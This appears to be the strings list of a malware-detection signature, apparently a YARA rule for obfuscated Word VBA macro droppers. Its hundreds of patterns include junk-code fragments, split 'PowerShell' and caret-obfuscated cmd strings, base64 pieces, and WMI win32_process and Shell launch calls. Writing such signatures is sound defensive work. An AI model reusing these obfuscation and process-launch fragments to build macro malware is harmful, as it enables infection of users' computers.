        $ = "Attribute VB_Control = \"rn51tfI, 0, 0, MSForms, ComboBox"
        $ = "Attribute VB_Control = \"sjQaAaUI, 0, 0, MSForms, ComboBox"
        $ = "Attribute VB_Control = \"zM8ksqra, 0, 0, MSForms, TextBox"
        $ = "Attribute VB_Name = \"B8807374"
        $ = "Attribute VB_Name = \"BHBYZjiEINI\""
        $ = "Attribute VB_Name = \"C93518"
        $ = "Attribute VB_Name = \"FAZwXB"
        $ = "Attribute VB_Name = \"GAD_DG"
        $ = "Attribute VB_Name = \"GcwzTqwMFhwucu\""
        $ = "Attribute VB_Name = \"HCHMtlFZj\""
        $ = "Attribute VB_Name = \"LkjIKwSUwwkTnX"
        $ = "Attribute VB_Name = \"MHcfFkjZ\""
        $ = "Attribute VB_Name = \"Marketing96"
        $ = "Attribute VB_Name = \"P324_802"
        $ = "Attribute VB_Name = \"PxAAAXA"
        $ = "Attribute VB_Name = \"Q98384"
        $ = "Attribute VB_Name = \"RH76qr"
        $ = "Attribute VB_Name = \"SI6wbVU3"
        $ = "Attribute VB_Name = \"TWsSKiaVwtTDK\""
        $ = "Attribute VB_Name = \"TznFGdWSDrwjIf\""
        $ = "Attribute VB_Name = \"WZbIoOvCY"
        $ = "Attribute VB_Name = \"bOX8wu"
        $ = "Attribute VB_Name = \"baO5AQ7"
        $ = "Attribute VB_Name = \"bwiOniizVBh\""
        $ = "Attribute VB_Name = \"cGDABAQ"
        $ = "Attribute VB_Name = \"hAAGB_A"
        $ = "Attribute VB_Name = \"iDXC_1"
        $ = "Attribute VB_Name = \"ihVETJiVClin"
        $ = "Attribute VB_Name = \"jWKEYwOmE\""
        $ = "Attribute VB_Name = \"kSSkRJvc"
        $ = "Attribute VB_Name = \"kztzzHWYZ\""
        $ = "Attribute VB_Name = \"lVr36URi"
        $ = "Attribute VB_Name = \"mAMYwODSErvVfz\""
        $ = "Attribute VB_Name = \"rCQAkUA"
        $ = "Attribute VB_Name = \"s7319992"
        $ = "Attribute VB_Name = \"ulwMK8UL"
        $ = "Attribute VB_Name = \"w1578953"
        $ = "Attribute VB_Name = \"w999057"
        $ = "Attribute VB_Name = \"wADZAQAQ"
        $ = "Attribute VB_Name = \"z048260"
        $ = "Attribute VB_Name = \"zADxxCk"
        $ = "AwiaUizEQnGwuztfOmAWk = (205715811 + Round(YiUHYCTXluwdrGnN) * 155653977"
        $ = "B163 = Z698"
        $ = "BBbEzBApXEEUjL = ChrB(306672186 / ChrB(141978636"
        $ = "BBvUsAF_"
        $ = "BJYYoH = UqQSf + zwSXFv"
        $ = "BOCXXYiRjVizBOFRlIbszUlfn"
        $ = "BOwCpJwW = \"74 ,\" + \" 6\" + \"8,65 , \" + \"99 , 76,\" + \" 73 ,\" + \"64, 13\" + \" , \" + \"1,86, 7\" + \"9"
        $ = "BSmIRdwjiL = \"i\" + CStr(Chr(ncGcuRLZTh + TcTMjkZ + 109 + EkRdcYLHWuqa + hlsqCsVOjcwthV))"
        $ = "BSvjJSwaQsOOaCXEYEKCiXcb = ChrB(236484674 / ChrB(14649624))"
        $ = "BZQDA_B = PQDwAD1Z _"
        $ = "BZsBWTVFWrR"
        $ = "B____0_6"
        $ = "BbpnvU = ChrB(22144 + _"
        $ = "Berkshire30 = eyeballs14"
        $ = "BfduMwHAwEWG"
        $ = "BoHINkXi = \",49\" + \",\" + \"65,45\" + \",3,\" + \"64\" + \",59,60,22,\" + \"1,71,\" + \"60,\" + \"65,23,61\" + \",33,\" + \"73,\" + \"37,56,68\" +"
        $ = "BtNEOp = \"^dDg^/^z\" + \"g^0^/sd^Z^:E\" + \"^LCplp^Ut^ue\" + \"7^tjq^4\" + \"hoE^s@^\" + \"ZTE^i^G\" + \"^B^t5N^Fu\" + \"^w^K^Dn\" + \"e0^iN^IXq"
        $ = "BtnQHE = 86903 + Atn(164) / 35262 / Round(56303) / 329 / CInt(YESBY"
        $ = "BuNmAaiHkwqbN"
        $ = "BvENzB = okVZdXk"
        $ = "BwAGUAUwBEAEMAK"
        $ = "BzwRMwWlBMzizKIwcwZI"
        $ = "C3_3_46_"
        $ = "CADAQA = Sin(j_xA1xAA"
        $ = "CBool(109168088"
        $ = "CBool(31650463"
        $ = "CBool(369406"
        $ = "CBool(810231615"
        $ = "CBool(936013713"
        $ = "CBool(QpSfCf"
        $ = "CBool(k599__41"
        $ = "CBool(u712__"
        $ = "CBool(widBQn"
        $ = "CByte(476465957"
        $ = "CByte(86533942"
        $ = "CByte(979041642"
        $ = "CByte(MDLfk"
        $ = "CByte(OEwIas"
        $ = "CByte(cwAcXQxG + _"
        $ = "CDate(136946572"
        $ = "CDate(183383044"
        $ = "CDate(46318"
        $ = "CDate(53284"
        $ = "CDate(60623"
        $ = "CDate(73564"
        $ = "CDate(78589"
        $ = "CDate(807038497"
        $ = "CDate(879574267) - HD_UkGB * CDbl(306879768)) + (943786069 + _"
        $ = "CDate(88020"
        $ = "CDate(BBx_DwQw"
        $ = "CDate(BDpTzLj"
        $ = "CDate(EoUAxBG"
        $ = "CDate(ZBQA_xA"
        $ = "CDate(fQUUXA"
        $ = "CDate(jBwAAQD1"
        $ = "CDate(mDA1GAkX * CVar(675032810 / CDate(m_A1ckw"
        $ = "CDate(wQDDA1"
        $ = "CDbl(10718679"
        $ = "CDbl(203074"
        $ = "CDbl(219793569"
        $ = "CDbl(372"
        $ = "CDbl(725528697"
        $ = "CDbl(wSLaE"
        $ = "CDbl(wUbMUk"
        $ = "CDbl(wrNco"
        $ = "CGkAoBAC"
        $ = "CInt(124226822"
        $ = "CInt(23341"
        $ = "CInt(44049487"
        $ = "CInt(8598"
        $ = "CInt(91069"
        $ = "CInt(940402362"
        $ = "CInt(MB_CQA + _"
        $ = "CInt(OXU4cBD"
        $ = "CInt(Uck4AUcw"
        $ = "CInt(cZA1Bx"
        $ = "CInt(sBDDQ4"
        $ = "CInt(zAGAZAA"
        $ = "CInt(zQAUwAD + CDate(225284472) / JAX44kDA * 568488764"
        $ = "CInt(zZUPw"
        $ = "CLng(125365967"
        $ = "CLng(130106536"
        $ = "CLng(188494236"
        $ = "CLng(200139268"
        $ = "CLng(256126740"
        $ = "CLng(278369354"
        $ = "CLng(343408280"
        $ = "CLng(8155166"
        $ = "CLng(MwNCv"
        $ = "CLng(TzvuQO"
        $ = "CLng(U1DABA14"
        $ = "CLng(XABAQXok"
        $ = "CLng(cuCoXP"
        $ = "CLng(iZZADo1"
        $ = "CLng(r7_7__6_"
        $ = "CLng(v7200861"
        $ = "CLng(wAQUA_c1"
        $ = "CQAAZQCc = oBA_ABXX"
        $ = "CSng(22808"
        $ = "CSng(231796796"
        $ = "CSng(47768"
        $ = "CSng(71343"
        $ = "CSng(CAAB4A"
        $ = "CSng(qDBUxABA"
        $ = "CStr(121654038"
        $ = "CStr(Chr(DotkfkLCdUUpIp"
        $ = "CStr(Chr(VaKShFEbC"
        $ = "CStr(Chr(jlkYvzNoQ"
        $ = "CStr(Chr(nPIODbjcHz"
        $ = "CStr(H774__55"
        $ = "CStr(X_5_39"
        $ = "CStr(fA14QX"
        $ = "CStr(i_94_02_"
        $ = "CStr(mXkDBXQ"
        $ = "CStr(oDDDXA"
        $ = "CStr(q25_5_4"
        $ = "CStr(s__892"
        $ = "CStr(w_355_72"
        $ = "CVGHzn = AjpLZp - TBmNLI / 47016 + qFjBnK"
        $ = "CVar(10607170"
        $ = "CVar(110895424"
        $ = "CVar(29165679"
        $ = "CVar(623544105"
        $ = "CVar(McQZA4"
        $ = "CZbmMhzPjql = \"^+19^ \" + \" 25 ^ \" + \"47 ^\" + \"+48 ^ \" + \" ^5\" + \" ^\" + \" ^ \" + \"32 20 \" + \"3^\" + \"3 ^"
        $ = "Call GetObject(J1wBAXU.K4AA4Qc.Text + MC4QQo.jAGcAQ + J1wBAXU.K4AA4Qc.ControlSource).Create((J1wBAXU.K4AA4Qc.Text + MC4QQo.ZAAA_"
        $ = "Call GetObject(LACBAQ_A.XQX1GX.Text + OAUCQB_A.sC4DUoU + LACBAQ_A.XQX1GX.Text).Create((LACBAQ_A.XQX1GX.Text + OAUCQB_A.q4AD4UAQ"
        $ = "Call Shell(it8wUgfEG(1) & BAqhCi & UiOvDnu & Nydpu9Se, 0)"
        $ = "Case \"Aoospq"
        $ = "Case \"LjE9M10R"
        $ = "Case \"usTE8na"
        $ = "Case \"wCJp7l"
        $ = "Case 118868804"
        $ = "Case 146621912"
        $ = "Case 149182203"
        $ = "Case 18782725"
        $ = "Case 211837363"
        $ = "Case 219490861"
        $ = "Case 254815665"
        $ = "Case 264360381"
        $ = "Case 295022822"
        $ = "Case 307615261"
        $ = "Case 415531204"
        $ = "Case 548968402"
        $ = "Case 584613318"
        $ = "Case 649863198"
        $ = "Case 71397906"
        $ = "Case 760151699"
        $ = "Case 7646736"
        $ = "Case 77394173"
        $ = "Case 786742599"
        $ = "Case 79816822"
        $ = "Case 863595752"
        $ = "Case 865481774"
        $ = "Case 962678222"
        $ = "Case f514_5_"
        $ = "CczCM(3) = 9"
        $ = "CfujT = \" 26 \" + \";\" + \" \" + \"13"
        $ = "Chr(552551117"
        $ = "Chr(816217398"
        $ = "Chr(942080572"
        $ = "Chr(95693569"
        $ = "Chr(BAxAAAA"
        $ = "Chr(i559_87"
        $ = "Chr(pJwuqp"
        $ = "Chr(t_BDDoDA"
        $ = "Chr(wYiEQZPjQ"
        $ = "ChrB(298648231"
        $ = "ChrB(3330217"
        $ = "ChrB(776236418"
        $ = "ChrB(83788"
        $ = "ChrB(99649"
        $ = "ChrB(G_97_25"
        $ = "ChrB(O3__708"
        $ = "ChrB(PwlviB"
        $ = "ChrB(p9961_2"
        $ = "ChrW(228362861"
        $ = "ChrW(98883"
        $ = "ChrW(ChKCH"
        $ = "ChrW(H1ZADBDD"
        $ = "ChrW(bjpzbh"
        $ = "ChrW(oIbipv"
        $ = "ChrW(sQWDbS"
        $ = "Close (\"223601089"
        $ = "Close (\"34373591"
        $ = "Close (\"458535077"
        $ = "Close (\"510091760"
        $ = "Close (\"55526268"
        $ = "Close (\"894080624"
        $ = "Close (\"956636474"
        $ = "Close (\"O574053_"
        $ = "Close (\"Q791___"
        $ = "Close (\"X_3_59"
        $ = "Close (\"a_774243"
        $ = "Close (\"s52_52"
        $ = "Close (\"t4588247"
        $ = "Const iflKAuswi = 0"
        $ = "Cos(540054759"
        $ = "Cos(648917387"
        $ = "Cos(M12189"
        $ = "Cos(M84767_"
        $ = "Cos(cnDjcLYi"
        $ = "Cos(woACBBAC"
        $ = "CreateObject (\"318218793"
        $ = "CreateObject (\"442434013"
        $ = "CreateObject (\"610506192"
        $ = "CreateObject (\"L32730"
        $ = "CreateObject (\"k531858"
        $ = "CreateObject (\"r_03589"
        $ = "CreateObject (\"u2_19009"
        $ = "CreateObject((\"winmg\" _"
        $ = "CvzVi = CBool(rKuuwPnEE"
        $ = "CxZA4U = CByte(19836487"
        $ = "D33_36_4.Create F524797 + I741619_ + u_4_4587, K1283489, Y348958, i744294"
        $ = "D4AGxk44 = Tan(RQBADDoc"
        $ = "DGXKRDoTpGBzljTPhh"
        $ = "DNQNUijwJqDILVDqQT"
        $ = "DTuHX10w"
        $ = "DX_R3wYf"
        $ = "D_38597.C722737.PasswordChar"
        $ = "DaHZGO = \"t \" + \". \" + \"=m\" + \"Em\" + \"Ji\" + \"aj\" + \"In\" + \"PNs\" + \"vL\" + \"L\" + \"jLV\" + \"fkp"
        $ = "Day 180790779"
        $ = "Day 342788369"
        $ = "Day 821201557"
        $ = "Day 993299439"
        $ = "Day CStr(ZQZDcBA _"
        $ = "DbiwzwQiw = GlvsFKQw"
        $ = "Debug.Print \"JUaSdRw"
        $ = "Debug.Print \"PtYczlUu"
        $ = "Debug.Print \"WwDh1kOw"
        $ = "Debug.Print \"dsjA6Dw5"
        $ = "Debug.Print Log(\"ST3SOG_K"
        $ = "Debug.Print Log(\"VHlE21"
        $ = "Debug.Print Log(\"wCwLRlj"
        $ = "Debug.Print \"172\" + (\"61\") + (\"siqiBj\" + (\"244\" + \"548\") + \"CujarQ\" + (\"YCQYbV9p"
        $ = "Debug.Print \"274\" + (\"122\") + _"
        $ = "Debug.Print \"288\" + (\"892\") + _"
        $ = "Debug.Print \"551\" + (\"115\") + (\"HdZOorHc\" + (\"329\" + \"989\") + \"uo0d7lbt\" + (\"TrNqLHlR"
        $ = "Debug.Print \"716\" + (\"787\") + _"
        $ = "Debug.Print \"763\" + (\"124\") + (\"lLo5VRP\" + (\"611\" + \"629\") + \"tJnnqa\" + (\"EPdjCjRp"
        $ = "Debug.Print \"8\" + (\"44\") + _"
        $ = "Debug.Print \"826\" + (\"309\") + (\"uz3s8R\" + (\"5\" + \"980\") + \"Z6jEJw\" + (\"MSGtCq"
        $ = "Debug.Print \"906\" + (\"662\") + _"
        $ = "Debug.Print \"BQ9Iho\" + (\"295\" + (\"dAhwFq\") + \"QiPYAj\" + \"177\") + \"zmhzz_B3\" + (\"YjtZnS\") + (\"FGsqHAY\" + \"Z6BszOj\" + \"646\" +"
        $ = "Debug.Print \"OXiX25B"
        $ = "Debug.Print \"SXfaEVL\" + (\"248\" + (\"OhX_W5\") + \"iwqlwVi\" + \"954\") + \"Nr5VdDQ\" + (\"KjzVzzc\") + (\"NvlECdr\" + \"nkJ8HJj_\" + \"664\" +"
        $ = "Debug.Print \"T5CvtVdz"
        $ = "Debug.Print \"TWHqUA\" + (\"VKr45T8O\") + \"P8Wf9Ou\" + \"Lci6GS\" + \"o0usnQpG\" + (\"qMZNtMX\" + (\"k3Y48C0"
        $ = "Debug.Print \"VJIwc6tR\" + (\"fwoiPvq8\") + \"Fd1FlzpO\" + \"FIVwaNN\" + \"tQzcoz\" + (\"hRuvCw8w\" + (\"CLqQih"
        $ = "Debug.Print \"WhwnPKhl\" + (\"A3wSZz\") + \"Gprznk\" + \"JJ0ilFmH\" + (\"WbJYL3Z\" + \"dbTYcUMu"
        $ = "Debug.Print \"Yi_muvuR\" + (\"716\" + (\"Eqnk2U2S\") + \"KuhW77\" + \"84\") + \"GHWNba\" + (\"NIIthi\") + (\"c_sz3an\" + \"OzdPwzp\" + \"476\" +"
        $ = "Debug.Print \"Yis3vpX\" + (\"BaRi4W\") + \"Ihrf56QQ\" + \"IIKZVr2S\" + \"Jwi2diW\" + (\"M7auNs\" + (\"BknclU6"
        $ = "Debug.Print \"bPjQEi2\" + (\"630\" + (\"HYlQ0AWk\") + \"DjiBOLA\" + \"321\") + \"jPnj4V\" + (\"bWRwdG\") + (\"RUbWRmnR\" + \"jfB5ihJS\" + \"62\" +"
        $ = "Debug.Print \"c4Z_HQ1\" + (\"715\" + (\"SfHWE1j\") + \"wrpC78\" + \"605\") + \"NN_q2z7U\" + (\"R3ncjpFV\") + (\"UVpFRFw5\" + \"CjMCdjW\" + \"680\" +"
        $ = "Debug.Print \"hH1rXCN\" + \"OaqUbZJ\" + \"LCN8pHav"
        $ = "Debug.Print \"iJSsaD\" + (\"G8CRR0dC\") + \"UH78liM\" + \"AiHuiEuq\" + \"C2EuOz\" + (\"QWju68C\" + (\"HoiujuJ"
        $ = "Debug.Print \"iibYqCs"
        $ = "Debug.Print \"iqSGnGY\" + (\"V1JMJaT\") + \"inap3i_N\" + \"FUjWDAm5\" + \"IIYuY5\" + (\"S85_rm4k\" + (\"pzHZriAQ"
        $ = "Debug.Print \"jniwLiJj"
        $ = "Debug.Print \"o6tRkTw\" + (\"fiibKXI\") + \"Z5tiS8QH\" + \"zuHWYwdF\" + \"JVcOkPJ\" + (\"pN07zR\" + (\"MnzBc1w"
        $ = "Debug.Print \"pHnEi8\" + (\"760\" + (\"Ww0Q1_LU\") + \"ACRAf8\" + \"987\") + \"j9J2nro\" + (\"UkwO6B\") + (\"cziiUd\" + \"oOjGIIjX\" + \"388\" +"
        $ = "Debug.Print \"pb9juA\" + (\"IfYcs0L\") + \"bhp61jp\" + \"H3WkYmzz\" + \"azGsPWv\" + (\"ATcqIb\" + (\"wW94Si5"
        $ = "Debug.Print \"q2G97c\" + \"bDEQW57r\" + \"PLPwPvR"
        $ = "Debug.Print \"q5GBH60"
        $ = "Debug.Print \"qpAJ40ur"
        $ = "Debug.Print \"qu6TzXh\" + (\"KSUjRSEI\") + \"mYV0ui\" + \"Z6JPAZK5\" + \"SkUYr7wb\" + (\"vIlzjB\" + (\"YvLzAi"
        $ = "Debug.Print \"tXYb_4p\" + (\"77\" + (\"nC6Wvrf\") + \"VG8nh2Vo\" + \"429\") + \"nivKO_D5\" + (\"NoPOMQz\") + (\"M8Ajkb8\" + \"ioOOKOqN\" + \"28"
        $ = "Debug.Print \"vvwQT_\" + (\"964\" + (\"hVnmZj1h\") + \"YPHYLsc\" + \"407\") + \"C7siKrPn\" + (\"wrQ6BFi\") + (\"Sp02jc2z\" + \"c3kNv2s\" + \"628\" +"
        $ = "Debug.Print \"w1Q9KM\" + (\"IJYop3\" + \"KTEluY"
        $ = "Debug.Print \"zFwjaUd\" + (\"afKIU4Tl\" + \"OEz4mD8L"
        $ = "Debug.Print \"zv1fo5zf"
        $ = "Debug.Print (\"bMsXK6T\" + \"qZjTcq8"
        $ = "Debug.Print (\"f2Ywl3S\" + \"AA2JLhm"
        $ = "Debug.Print (\"kr_7M_R\" + \"QMN5V0"
        $ = "Debug.Print (275) + iF5CZYb1"
        $ = "Debug.Print (57) + ZS_WMIs7"
        $ = "Debug.Print (VYTJTBpV) + (511"
        $ = "Debug.Print (rizk__) + (698"
        $ = "Debug.Print Log(\"NkCGWFn8"
        $ = "Debug.Print Log(\"TZKjj1"
        $ = "Debug.Print Log(\"V8RkDV"
        $ = "Debug.Print Tan(\"bcYzoY"
        $ = "Debug.Print Tan(\"dPwvHvR"
        $ = "Dim DSDcN(3"
        $ = "Dim EBJMa"
        $ = "Dim HE1dmaP As Long"
        $ = "Dim Jjlmd(1"
        $ = "Dim MRHMwE(1"
        $ = "Dim SFypH As Byte"
        $ = "Dim SwqUE(2"
        $ = "Dim XY4jKd As Integer"
        $ = "Dim YbMmY(1"
        $ = "Dim acmjpm"
        $ = "Dim eCeQfF As Double"
        $ = "Dim fzAbV(1"
        $ = "Dim ghuUDsz7 As Single"
        $ = "Dim iKBLmf"
        $ = "Dim k86_0814"
        $ = "Dim kVSMr(2"
        $ = "Dim kWpwaC(2"
        $ = "Dim lmxwvg As String"
        $ = "Dim mCrZU"
        $ = "Dim rThEC(1"
        $ = "Dim rzrNm"
        $ = "Dim sFiXVP(2"
        $ = "Dim sX7Db As Byte"
        $ = "Dim wTlAkl(1"
        $ = "Dim xwKuEUV As String"
        $ = "DizHtnk = \"OwerSHe\" + \"ll \" + \". \" + \"( \" + \"$VErBoS\" + \"eprefEREnCE\""
        $ = "Do While IDAAB_wx < TDowQc"
        $ = "Do While YwXAA1U And cAcAADw"
        $ = "DpiEzobnRzB"
        $ = "Dpjon = CDbl(wVttw"
        $ = "DrKnN = 90477 * IqbqJD * 3717 - zibmPd / (rzSon * VmIGB * 81359 * 68674) / (76136 / jkPXV - iXioT * fMGCN"
        $ = "DzZVZAGIihu"
        $ = "E0996_2S4436121w2082634L9_0083"
        $ = "E3951173 = (\"362559600\" + \"o18844_1\" + (\"h75957_6\" + (\"883431254\") + (\"509583654\" + (\"938274462"
        $ = "EJwlN = CDate(HHvWS + Sin(95589 + 27260) * 55755 * CInt(15484"
        $ = "EMiToR = CwRCI - XRNWTd + 4356 - OUwOKL + (51875 / DpHlI + 50898 + MhINlc"
        $ = "EQAQDcxx = 91218929 * U4k1Xw4"
        $ = "EgcF76fX = Sgn(24707"
        $ = "EhoOzmBCXwmNPjqEUcvHnIZp"
        $ = "ElseIf CDQxQo = KAUAwA_ Then"
        $ = "ElseIf HcAoAxx = EAAUUABU Then"
        $ = "ElseIf XDABADXU = o_kG_X Then"
        $ = "ElseIf ZDAGAoA = F1xXU4BA Then"
        $ = "ElseIf aAAAQoDQ = loQBAA Then"
        $ = "ElseIf nD_kAA = DAcABD Then"
        $ = "ElseIf rAXGAAUc = iAUAUAAC Then"
        $ = "ElseIf tUAAAQA = LAXAAAX Then"
        $ = "Engineer74"
        $ = "ErEPIYfw"
        $ = "ExBAwo = (191299185 - JB_oAA4 * mAQ4XB * CDate(928063797"
        $ = "EzuwsJvccq"
        $ = "F0528546"
        $ = "F71515_3"
        $ = "F747 = J6956"
        $ = "FCBck = 2101561 - Sqr(sNUPQjKpIAnF * Fix(zkmRKHXtVn) + 7371889 / XdfTisai) - 2384264 * HzzYmXn * DCClGmDjlNnrX + CDbl(4993512 * Int(6649359) / 1133199 * Tan(8743190)) / fVaHMbI / CByte(8997083 - CDbl(nSmVAFdjjGl))"
        $ = "FEjSSu(0) = InStrRev(fuizhiB + UYaNFAFDUoBvEOkvYU + QrCzWR, OwpNMpf + jNOZcazKuTzFFFKVDm + dtZCGhHO)"
        $ = "FG1DBAAk"
        $ = "FMASQBvAG4AL"
        $ = "FOqzu(0) = MidB(shwKz, 567, 135) + MidB(shwKz, 567, 135) + Left(iMCJl, 246) + Mid(fmwSuvRQ, 102, 719"
        $ = "FQuVlU = \"1\" + \"9;\" + \"8;4\" + \"3;41;40;\" + \"74;40;45\" + \";\" + \"71;66;55;8\" + \";8;67;\" + \"62;67;40\" + \";53;53;59;\" + \"40;71;66"
        $ = "FUkOBA = OwwqQn * AKYzbM * ECwcs * jHuNt + (cCliI * NiIHm / wljiu - 11702"
        $ = "FXCCxZBU = 205256488 - ChrB(159647087 * Round(539598844) + nAZQ4Q - ChrB(pBUXAABD)) / D_k1xBD / Rnd(921123430 / nZXAAZQ * SpBb /"
        $ = "FcAiV = 38"
        $ = "Fix(116901095) - XA_QBA * Log(212062043)) + (735261617 + _"
        $ = "Fix(219749515"
        $ = "Fix(245074480) - QX_AQkQB * CSng(639311380)) + (377963518 + _"
        $ = "Fix(286693881"
        $ = "Fix(29765242"
        $ = "Fix(339964202"
        $ = "Fix(698558485"
        $ = "Fix(738589427"
        $ = "Fix(792034729"
        $ = "Fix(87674129"
        $ = "Fix(922144074"
        $ = "Fix(AiMJFKRqYWSYGwIXPc"
        $ = "Fix(QkXDAw"
        $ = "Fix(jo4AUAoQ"
        $ = "Fix(wbWrwzLCBJmciHbZfU"
        $ = "FkMYFrWkaJtXQiUz"
        $ = "FmESkN = 7911725 - Sqr(ADIKObl * Fix(RiGOBotDcms) + 2803529 / nwUzNmh) - 3907502 * kTSSdUVWzsiBSF * VYPMwcoia + CDbl(841686 * Int(2474083) / 1520946 * Tan(7547353)) / AoEGSunv / CByte(6705158 - CDbl(ZhFnAkzU))"
        $ = "FnfEuU5pX = Sgn(30991.687716647)"
        $ = "For CFzjccoqz = 14805102 To OUozip"
        $ = "For Each ChioL In OrTOqTO"
        $ = "For Each YfTPV In ZnBfZ"
        $ = "For Each ZksEl In XCEJot"
        $ = "For Each djOQE In IQFEuw"
        $ = "For Each iPBvE In moIbrh"
        $ = "For Each jYwsTE In mTkqd"
        $ = "For JtdCS = 258822360 To JrcGvDk"
        $ = "For QhczNT = aoRld To 9123"
        $ = "For ZpzQdESu = 71090541 To mUYpU"
        $ = "For zCbZrQvJ = 148318506 To iQLGHOp"
        $ = "FqHTRA(4) = 8583"
        $ = "Function Assistant78"
        $ = "Function CWqiKVjzwIw"
        $ = "Function QsJVIZZjWt"
        $ = "Function RdoiDMjKl"
        $ = "Function T1WRYYs"
        $ = "Function ThUMFsqz"
        $ = "Function a1c_DGA"
        $ = "Function bfNnwGknjOi"
        $ = "Function dtaAzQ"
        $ = "Function jJFKbTtoJbGsCo(pWODjaXkvo As String"
        $ = "Function m1CQQA"
        $ = "Function o1845290(w384214"
        $ = "Function pTwKXDRvWNi"
        $ = "Function r3073_(X977412"
        $ = "Function tbYJwrEjw"
        $ = "Function vqAAbELQ"
        $ = "Function zAAoUUx"
        $ = "Function zawzzLdn"
        $ = "FvO1WNzT"
        $ = "FwaaPcliVZLkNsNBOOJED"
        $ = "FziktR(2"
        $ = "G04_2___ = 974010822 - 555326219"
        $ = "G075427O556991j19_69C853284"
        $ = "G1cU1XA = \"G\" + \"8AY\" + \"g\" + \"B\" + \"qAG\" + \"UAY\" + \"wB0\" + \"AC\" + \"A\" + \"A\" + \"T\" + \"gB\" + \"lA\" + \"H\" + \"QAL\" + \"gB\" + \"XAG\" +"
        $ = "GVkBWHdi"
        $ = "GZ1ACAAw"
        $ = "GZRGPjckc = \"\" + otXAwAiM + OKPqC + ActiveDocument.Name + zwZjG + CQtTi"
        $ = "GZrhiGqo"
        $ = "G_33596 = \"H371119"
        $ = "G_AAAGBc"
        $ = "GcoxUGXx"
        $ = "GdTqjmwJ"
        $ = "GddjiIjGdkYwoiDnNjGqsNQGwU"
        $ = "Gdiamz(2"
        $ = "GetObject(\"WiN"
        $ = "GetObject(\"wi\" + \"n\" + \"mg\" + \"mts:w\" + \"in32\" + \"_proc\" + \"ess\") _"
        $ = "GetObject(CStr(\"Winmgmt"
        $ = "GetObject(JXZkGG.aCZAkCD). _"
        $ = "GetObject(lxoCDC4A.w_QA4_ + tGoDQQ.skCD4D + lxoCDC4A.w_QA4_) _"
        $ = "GjzTumsPKPviWATGQi"
        $ = "GkDACBk.PX_11QAX"
        $ = "Gmatu = fcWJzz = UEdsl"
        $ = "Gorgeous40"
        $ = "GtcCHY = (pBVcR - klGHs) * nGqbX / NPPuR / 94339 * hRaiF"
        $ = "H0AewA5ADcAf"
        $ = "H2156_88"
        $ = "H63_4_ = Y1___134"
        $ = "H79936 = Rnd(U932_374"
        $ = "H865082_ = vbError - vbError"
        $ = "HASPWaptjikzktsHTZ"
        $ = "HDxwUAAZ = 355880773 * XDxBc14"
        $ = "HMKvdIEmRqJhzhAqs"
        $ = "HOzldP = CDbl(IjtLH)"
        $ = "HTowcwGj = CBool(zivqGhOkz"
        $ = "HWvWHs = \" ; \" + \" 6^0 \" + \"5\" + \"5^ 4^\" + \"4\" + \" ^ 0^\" + \" \" + \"^ 42 \" + \" ^2\" + \"7"
        $ = "HX_A_xA = 268356235 * Hex(943096616) / 863510668 + Sqr(311037146) * 61100493 / CInt(121554886) * (577288932 * 841262464"
        $ = "HXhmUbEHJmivBP"
        $ = "Hex(46094484"
        $ = "Hex(593994650"
        $ = "Hex(9900551"
        $ = "Hex(B37707"
        $ = "Hex(CODhuj"
        $ = "Hex(EdqCIrPEZLlZYSwuZ"
        $ = "Hex(FOYKMC"
        $ = "Hex(IhGbJZZDorlSftbRwwOVz"
        $ = "Hex(MjwjrF"
        $ = "Hex(N78379"
        $ = "Hex(PzXJI"
        $ = "Hex(vVvYLCSP"
        $ = "Hk4AAoUD"
        $ = "HmhLjljzbSPbqTOKaQTFSD = DjfSbISZKjdSsLSTkJCFtZu"
        $ = "Hour \"AjacQAW\" + \"lYfX\" + \"dN\" + \"P"
        $ = "Hour \"BDZD\" + \"ZWJakL\" + \"4317\" + \"JZrq"
        $ = "Hour \"DhiY\" + \"469792303"
        $ = "Hour \"OO\" + \"6746"
        $ = "Hour \"lFS\" + \"YSGDcXhtw\" + \"IkYdGzEcqFt\" + \"aEPEzCF"
        $ = "Hour \"tYkQLYizv\" + \"CS\" + \"Yiw\" + \"zXiuWU"
        $ = "Hour \"vAjKkn\" + \"397685715"
        $ = "Hour 66327 * qwiiOs / 51725 / wwWiF"
        $ = "Hour AnKOW / SkPwH / adtnY / 86481"
        $ = "HtHUH = qZNRom"
        $ = "I\", \"Q\", \"mj\", \"E\", \"PI\", \"aP\", \"Am\", \"qU\", _"
        $ = "I5376932"
        $ = "I6009126.J613639"
        $ = "IBKsCMcc"
        $ = "IDBCBXk = cUGwA_BA"
        $ = "IDiHju = (81818 - avdHBE * wNAMUj + DvLcN * (rJvCB / oJroG * HifzR + zpfEt"
        $ = "IEJj3i6Z"
        $ = "IGjlQHNRoOkXEzKZlDPACT = 116068677 - pqdrjSEpiGmwGjPEPMPnENoz"
        $ = "INhMPMjHL = CBool(fdAzZ"
        $ = "IQbcMvlZ"
        $ = "ITzTR = \"M\" + \"D /\" + \"v^ ^ /\" + \"c\" + \" \" + Chr(2 + 5 + 2 + 0 + 25) + \" \""
        $ = "IZczMb(0"
        $ = "IZczMb(1"
        $ = "IbJuPpvOm = 141284696"
        $ = "If -168 + 232 = -1437 + 1442 Then"
        $ = "If AAkAoU = MAAAAUZG Then"
        $ = "If BJKiOW <> sUjWF Then"
        $ = "If Dir(ORSUlWtfX) = \"\" Then"
        $ = "If DkwdQX >= mhaWVE Then"
        $ = "If FkAw4A = wUAAkQ Then"
        $ = "If GokAcA > iQABDA Then"
        $ = "If GwBUAUZ = zZ4UZAAZ Then"
        $ = "If H_AUGcw < _"
        $ = "If K84_6_ <> u3_720 Then"
        $ = "If KwXAkA = ucAxoA Then"
        $ = "If LMUJan <> 2 Then"
        $ = "If MdsTtw Eqv mkSYY Then"
        $ = "If QqpGfG > UwImd Then"
        $ = "If SUPLi > ZQiLw Then"
        $ = "If SwUUCo Xor zAAoUB Then"
        $ = "If TDIhR And PULzQ Then"
        $ = "If TTIsuu Or owKpAw Then"
        $ = "If VAZCUB = QXcAwDkB Then"
        $ = "If ViwOnt <= 6 Then"
        $ = "If YGqiR Xor fsdRwb Then"
        $ = "If ZQAAAA4x = WAcAAAZG Then"
        $ = "If aQUBUAAZ = A1UADBD Then"
        $ = "If acADcD Eqv 950535512 Then"
        $ = "If bAcQ1AAG = FUcBwc Then"
        $ = "If cQkdh <> AKvYJ Then"
        $ = "If cRRQX = 4 Then"
        $ = "If dOlGO Xor WSwRzK Then"
        $ = "If dzujA Or jiwiA Then"
        $ = "If ibYzpB Eqv GUzJNZ Then"
        $ = "If ivijW Eqv 12 Then"
        $ = "If jAC1AAwZ = 893399650 Then"
        $ = "If jAUxQA = SxGA__ Then"
